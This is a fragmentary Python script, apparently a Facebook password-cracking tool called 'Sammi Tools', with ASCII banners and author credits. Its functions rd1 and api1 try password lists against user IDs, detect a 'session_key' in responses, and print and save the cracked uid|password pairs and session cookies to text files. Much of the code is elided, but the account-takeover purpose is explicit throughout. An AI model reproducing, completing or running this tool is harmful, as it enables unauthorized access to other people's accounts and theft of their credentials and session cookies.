# Orignally Written By Sammi Khan
...
try:
	...
	os.system('python Sammi.py')
os.system("clear")
print('\n\033[1;32m Loading Sammi Tools...')
...
88  `8D 88'     88   88 d8' `8b __                           _ 
/ _\ __ _ _ __ ___  _ __ ___ (_)
\ \ / _` | '_ ` _ \| '_ ` _ \| |
_\ \ (_| | | | | | | | | | | | |
\__/\__,_|_| |_| |_|_| |_| |_|_P YP   YP YP   YP VP   V8P\033[1;32m XD\033[1;37m 
----------------------------------------------
\033[1;32m•\033[1;37m CREATED BY  \033[1;32m •√\033[1;37m  Sammi MALIK
\033[1;32m•\033[1;37m FACEBOOK    \033[1;32m •√\033[1;37m  Sammi MALIK
...
def rd1(ids,passlist):
	try:
		...
		sys.stdout.write('\r\r\33[1;37m[Sammi]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		for pas in passlist:
				...
				if 'session_key' in po:
						...
						print('\r\r\033[1;32m[Sammi-OK] '+uid+' | '+pas)
						print(' \33[1;96m[Cookies] == '+cookie)
						file_path_ok = os.path.join(folder_path, 'Sammi_RANDOM_OK.txt')
						file_path_cookies = os.path.join(folder_path, 'Sammi_COOKIES.txt')
						...
						#print(f'\r\r\33[1m\33[1;35m [Sammi-CP] '+uid+' | '+pas+'\033[1;97m')
						file_path = os.path.join(folder_path, 'Sammi-CP.txt')
...
def api1(ids,names,passlist):
	try:
		global ok,loop,sim_id
		sys.stdout.write('\r\r\33[1;37m[Sammi-M1]  %s|  OK:-%s \033[1;37m'%(loop,len(oks)));sys.stdout.flush()
		fn = names.split(' ')[0]
		try:
			ln = names.split(' ')[1]
		except:
		...
		for pw in passlist:
			...
			if 'session_key' in po:
					...
					print('\r\r\033[1;32m [Sammi-OK] '+uid+' | '+pas)
					print(' \33[1;96m[Cookies] == '+cookie)
					file_path = os.path.join(folder_path, 'Sammi_FILE_OK.txt')
					with open(file_path, 'a') as file:
						file.write(uid+'|'+pas+'\n')
					oks.append(uid)
					break
